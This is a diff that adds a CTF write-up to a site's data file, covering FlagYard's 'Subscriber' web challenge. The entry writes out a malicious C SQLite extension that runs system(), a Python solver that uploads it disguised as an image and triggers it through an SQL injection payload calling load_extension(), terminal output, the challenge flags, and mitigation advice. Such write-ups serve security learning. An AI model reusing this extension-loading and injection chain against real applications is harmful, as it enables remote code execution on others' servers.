@@ -644,4 +644,89 @@ export const writeups: WriteUp[] = [{
   "flag": "247CTF{0073c38db2a4d3c1209caa84ccc5668f}",
   "lessonsLearned": "**File Upload Validation** - File upload validation must use multiple independent checks - magic bytes alone are insufficient. Always use whitelist MIME types, disable PHP execution in upload directories, and validate file content properly.\n\n**XML Security** - Never enable LIBXML_DTDLOAD flag unless absolutely necessary. XXE vulnerabilities are critical in XML processing with potentially catastrophic impact.\n\n**Deserialization Gadgets** - PHP magic methods (__destruct, __wakeup, __toString) combined with user-controllable object properties create dangerous deserialization gadget chains. Audit all classes with magic methods for exploitation potential.\n\n**Stream Wrappers** - Phar archives with stream wrappers (phar://) automatically trigger deserialization. Treat php:// and phar:// URI schemes as code execution vectors and restrict their use.\n\n**Payload Optimization** - Size-limited payloads can be optimized through algorithm selection (MD5 vs SHA256 signatures) and tight code golf. Always account for creative constraints when building exploits.\n\n**Defense in Depth** - Multi-layer exploitation chains are more likely to bypass defense in depth. Defensive measures must address all layers simultaneously, not just individual components.\n\n**Exposure Prevention** - Command execution endpoints should never be exposed. The webshell a.php demonstrates that even small successful writes lead to complete system compromise."
 
+},
+{
+  "id": "11",
+  "title": "Subscriber",
+  "category": "Web",
+  "difficulty": "Hard",
+  "points": 0,
+  "date": "2025-02-24",
+  "author": "nata",
+  "ctfName": "FlagYard",
+  "description": "SQLite extension loading RCE vulnerability. Exploit SQL Injection combined with unrestricted file uploads and SQLite load_extension() to achieve remote code execution.",
+  "problemDescription": "A Flask application integrated with SQLite database configured with enable_load_extension(True). The /subscribe endpoint is vulnerable to SQL Injection through the updates_freq parameter. The /feedback endpoint allows file uploads with weak validation. The challenge is to combine both vulnerabilities to achieve RCE and read the flag from the system.",
+  "tools": [
+    "Python",
+    "GCC",
+    "SQLite",
+    "SQL Injection",
+    "Requests"
+  ],
+  "analysis": "Vulnerability analysis reveals three critical components enabling RCE:\n\n1. **SQL Injection in /subscribe**: The updates_freq parameter uses f-string interpolation without sanitization, allowing arbitrary SQL command injection.\n\n2. **Unrestricted File Upload**: The filter_filename function only checks file extension at the end of the filename with no magic bytes validation. A .so (shared object) file can be uploaded with name shell.jpg and stored in ./uploads/ directory.\n\n3. **SQLite load_extension()**: Database configuration with enable_load_extension(True) allows loading custom shared libraries. When load_extension('path/to/shell.so') is called, C code in the library executes with Flask process privilege.\n\n**Vulnerability Chain**: C extension payload runs automatically during loading (initialization phase). Since Flask is stateless, we leverage this to execute system commands (system()) redirecting output to an accessible file.",
+  "solution": [
+    {
+      "title": "Executive Summary",
+      "content": "Subscriber is an advanced web challenge simulating security failures in SQLite database integration with Flask. The vulnerability originates from simple SQL Injection which escalates to Remote Code Execution (RCE) through SQLite extension loading feature. Attackers exploit file validation gaps to upload malicious C libraries (shared objects)."
+    },
+    {
+      "title": "Reconnaissance",
+      "content": "The application has several functional endpoints:\n\n- `/`: Home page\n\n- `/subscribe`: Email subscription form using the `updates_freq` parameter\n- `/feedback`: Feedback submission form allowing file uploads\n\n**Database Identification**\n\nThrough error-based and boolean-based probing, the application uses SQLite. The critical finding is the database configuration explicitly allowing extension loading.\n\nDatabase configuration allows extension loading:\n\n```\n================ VULNERABLE CONFIG ================\nconn.enable_load_extension(True)\n================================================\n```\n\n**SQL Injection (Blind Boolean)**\n\nThe `updates_freq` parameter on `/subscribe` endpoint is vulnerable to SQL Injection due to f-string interpolation without sanitization:\n\n```\n================ VULNERABLE QUERY ================\ncursor.execute(f\"SELECT freq FROM updates_freq WHERE option = '{update_option}'\")\n================================================\n```\n\nBasic payload: `' OR 1=1 -- -`"
+    },
+    {
+      "title": "Vulnerability Analysis - Unrestricted File Upload",
+      "content": "**Vulnerability #1: Unrestricted File Upload (Extension Bypass)**\n\nThe filter_filename function only checks file extension at the filename end without validating actual content (magic bytes). An attacker can upload a .so (C library) file named shell.jpg, and the application stores it in the ./uploads/ directory."
+    },
+    {
+      "title": "Vulnerability Analysis - SQLite Extension Loading RCE",
+      "content": "**Vulnerability #2: SQLite Extension Loading RCE**\n\nThe load_extension() function in SQLite allows loading custom shared libraries. If an attacker can direct this function to an uploaded .so file, the C code inside the library executes with the same privileges as the web application."
+    },
+    {
+      "title": "Exploitation - Malicious C Extension",
+      "content": "**Step 1: Creating Malicious SQLite Extension**\n\nCreate a SQLite extension that executes system commands immediately when the library is loaded (initialization phase). This is crucial because Flask is stateless—database connections close after each request.",
+      "code": "#include <sqlite3ext.h>\n#include <stdlib.h>\n\nSQLITE_EXTENSION_INIT1\n\nint sqlite3_extension_init(sqlite3 *db, char **pzErrMsg,\n                          const sqlite3_api_routines *pApi) {\n    SQLITE_EXTENSION_INIT2(pApi);\n    \n    // Payload executes automatically when load_extension() is called\n    system(\"cat /app/flag.txt > ./uploads/out.txt\");\n    \n    return SQLITE_OK;\n}\n\n// Compile with: gcc -shared -fPIC -o shell.so shell.c -lsqlite3"
+    },
+    {
+      "title": "Exploitation - Python Solver",
+      "content": "**Step 2: Exploit Automation Script**\n\nThis script uploads the payload and triggers execution through SQL Injection in a single workflow.",
+      "code": "import requests\nimport time\n\nbase_url = \"http://ukjmwexhynntzwdgyxvsda-0.playat.flagyard.com\"\n\n# 1. Upload malicious extension\nwith open('shell.so', 'rb') as f:\n    requests.post(f\"{base_url}/feedback\", \n                 data={'title': 'Exploit', 'description': 'RCE'}, \n                 files={'file': ('shell.jpg', f, 'application/octet-stream')})\n\n# 2. Trigger RCE via SQL Injection\npayload = \"0' AND load_extension('./uploads/shell.jpg') -- -\"\nrequests.post(f\"{base_url}/subscribe\", \n             data={'email': 'a@b.com', 'updates_freq': payload})\n\n# 3. Read command output\ntime.sleep(1)\nprint(requests.get(f\"{base_url}/uploads/out.txt\").text)"
+    },
+    {
+      "title": "Terminal - Step 1: Directory Exploration",
+      "content": "**Step 1: Explore Root Directory** (`ls -la /`)\n\nInitial command to map the system structure.",
+      "code": "================ OUTPUT BASH ================\ntotal 76\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 .\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 ..\ndrwxr-xr-x   1   1000    1000 4096 Feb 23 20:34 app\nlrwxrwxrwx   1 nobody nogroup    7 Sep 26  2024 bin -> usr/bin\n...\ndrwxr-xr-x  12 nobody nogroup 4096 Sep 26  2024 usr\ndrwxr-xr-x  11 nobody nogroup 4096 Sep 26  2024 var\n=============================================="
+    },
+    {
+      "title": "Terminal - Step 2: Locate Flag File",
+      "content": "**Step 2: Search Application Directory** (`ls -R /app`)\n\nLocate the actual flag file.",
+      "code": "================ OUTPUT BASH ================\n/app:\napp.py\nconfig.py\nflag.txt  <-- FLAG FOUND!\ninstance\nrun\nsite.db\nstatic\ntemplates\nuploads\n=============================================="
+    },
+    {
+      "title": "Terminal - Step 3: Extract Flag",
+      "content": "**Step 3: Read Flag File** (`cat /app/flag.txt`)\n\nExtract the flag content.",
+      "code": "nata@rblx-labs ~/ctf/flagyard/web/13 % python3 solve.py\n[+] Phase 1: Uploading malicious extension...\n[+] Phase 2: Loading extension & Triggering Execution...\n[+] Phase 3: Retrieving output from /uploads/out.txt...\n\n================ OUTPUT BASH ================\nFlagY{d65441712f1d145acbad77b9d78c87be}\n=============================================="
+    },
+    {
+      "title": "Conclusion & Mitigation",
+      "content": "The attack succeeds due to a combination of:\n\n**1. Insecure SQL Usage**\n\nNever use string interpolation in SQL queries. Always use parameterized queries with placeholders:\n\n```\n================ SECURE QUERY ================\ncursor.execute(\"SELECT freq FROM updates_freq WHERE option = ?\", (update_option,))\n================================================\n```\n\n**2. Database Misconfiguration**\n\nDo not enable load_extension in production. Keep extension loading disabled and restrict only to trusted administrators in controlled environments:\n\n```\n================ SECURE CONFIG ================\nconn.enable_load_extension(False)  # Default behavior\n================================================\n```\n\n**3. Weak File Validation**\n\nDo not rely solely on filename extensions. Implement multiple validation layers:\n- Validate magic bytes (file signatures)\n- Use whitelist MIME types\n- Disable script execution in upload directories (/uploads/.htaccess)\n- Rename uploaded files with random strings",
+      "code": "# Secure file upload validation\nimport mimetypes\nimport os\nfrom pathlib import Path\n\nALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}\nALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif'}\n\ndef validate_upload(file):\n    # 1. Check extension\n    _, ext = os.path.splitext(file.filename)\n    if ext.lower()[1:] not in ALLOWED_EXTENSIONS:\n        raise ValueError(\"Invalid file extension\")\n    \n    # 2. Check MIME type\n    mime, _ = mimetypes.guess_type(file.filename)\n    if mime not in ALLOWED_MIMES:\n        raise ValueError(\"Invalid MIME type\")\n    \n    # 3. Check magic bytes\n    import magic\n    file_type = magic.from_buffer(file.read(1024), mime=True)\n    file.seek(0)  # Reset file pointer\n    if file_type not in ALLOWED_MIMES:\n        raise ValueError(\"Magic bytes do not match expected format\")\n    \n    return True"
+    }
+  ],
+  "terminalOutputs": [
+    {
+      "command": "ls -la /",
+      "output": "total 76\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 .\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 ..\ndrwxr-xr-x   1   1000    1000 4096 Feb 23 20:34 app\nlrwxrwxrwx   1 nobody nogroup    7 Sep 26  2024 bin -> usr/bin\ndrwxr-xr-x   2 nobody nogroup 4096 Sep 26  2024 boot\ndrwxr-xr-x   5 nobody nogroup 4096 Feb 23 19:42 dev\ndrwxr-xr-x   1 nobody nogroup   66 Feb 23 19:42 etc\ndrwxr-xr-x   1 nobody nogroup   19 Dec 26  2018 home\nlrwxrwxrwx   1 nobody nogroup    7 Sep 26  2024 lib -> usr/lib\nlrwxrwxrwx   1 nobody nogroup    9 Sep 26  2024 lib64 -> usr/lib64\ndrwxr-xr-x   2 nobody nogroup    6 Dec 29  2018 media\ndrwxr-xr-x   2 nobody nogroup    6 Dec 29  2018 mnt\ndrwxr-xr-x   2 nobody nogroup    6 Dec 29  2018 opt\ndr-xr-xr-x 117 root   root       0 Dec 26  2018 proc\ndr-xr-x---   2 root   root     160 Feb 23 19:42 root\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 run\ndrwxr-xr-x   1 root   root      32 Dec 29  2018 sbin\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 srv\ndr-xr-xr-x  13 root   root       0 Dec 26  2018 sys\ndrwxrwxrwt   1 root   root      36 Feb 23 19:48 tmp\ndrwxr-xr-x   1 root   root      19 Dec 26  2018 usr\ndrwxr-xr-x   1 root   root      17 Dec 29  2018 var"
+    },
+    {
+      "command": "ls -R /app",
+      "output": "/app:\napp.py\nconfig.py\nflag.txt\ninstance\nrun\nsite.db\nstatic\ntemplates\nuploads"
+    },
+    {
+      "command": "python3 solve.py",
+      "output": "[+] Phase 1: Uploading malicious extension...\n[+] Phase 2: Loading extension & Triggering Execution...\n[+] Phase 3: Retrieving output from /uploads/out.txt...\n\nFlagY{d65441712f1d145acbad77b9d78c87be}"
+    }
+  ],
+  "flag": "FlagY{d65441712f1d145acbad77b9d78c87be}",
+  "lessonsLearned": "**SQL Injection Prevention** - Never use string interpolation in SQL queries. Always use prepared statements with parameter binding to prevent SQL Injection attacks. Treated untrusted input as data, not code.\n\n**Database Extension Security** - Database extension features like load_extension() must be disabled in production environments. Restrict extension loading only to trusted administrators in controlled environments with proper auditing.\n\n**File Upload Validation** - File upload validation must not depend on a single defense layer. Implement multiple validation layers: extension whitelist, magic bytes verification, MIME type checking, and disable script execution in upload directories with proper server configuration.\n\n**Principle of Least Privilege** - Enable only the functionality required and disable everything unnecessary. SQLite enable_load_extension should be disabled by default in production deployments. Review all enabled features regularly.\n\n**Stateless Application Design** - Even though Flask is stateless, side effects from library loading can persist through the file system. Audit all initialization code in loaded extensions for unintended consequences and security implications.\n\n**Defense in Depth** - Multiple individually minor vulnerabilities can combine to create critical RCE. Secure development requires comprehensive security testing across all components and threat modeling of vulnerability chains."
+
 }];
